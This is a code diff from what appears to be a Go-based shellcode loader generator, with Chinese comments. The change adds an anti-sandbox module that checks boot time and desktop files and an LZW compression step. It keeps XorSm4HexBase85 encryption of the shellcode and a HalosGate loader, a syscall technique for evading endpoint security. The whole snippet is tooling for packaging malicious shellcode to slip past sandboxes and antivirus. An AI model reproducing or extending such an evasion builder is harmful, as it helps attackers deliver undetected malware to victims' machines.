@@ -12,6 +12,20 @@ import (
 )
 
 func main() {
+	// 反沙箱模块
+	sandbox := render.SandBox{
+		Methods: []string{
+			"sandbox.BootTime()",
+			"sandbox.GetDesktopFiles()",
+		}}
+
+	// 压缩算法模块
+	compressor := render.Compressor{
+		Import:    "variant/compress",
+		Algorithm: "compress.LzwDecompress",
+		Ratio:     8,
+	}
+
 	// 定义模板渲染数据
 	data := render.Data{
 		KeyName:    rand.RStrings(),
@@ -22,6 +36,8 @@ func main() {
 		PlainText:  rand.RStrings(),
 		Decrypt:    "XorSm4HexBase85Decrypt",
 		Loader:     "HalosGate",
+		Compressor: compressor,
+		SandBox:    sandbox,
 	}
 
 	// 设置加密参数
@@ -31,7 +47,7 @@ func main() {
 		IV:        []byte(data.IvValue),
 	}
 	// 加密之后的 shellcode
-	tmp, err := params.SignSetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
+	tmp, err := params.SetKeyIV(crypto.XorSm4HexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
 	if err != nil {
 		log.Fatal(err)
 	}
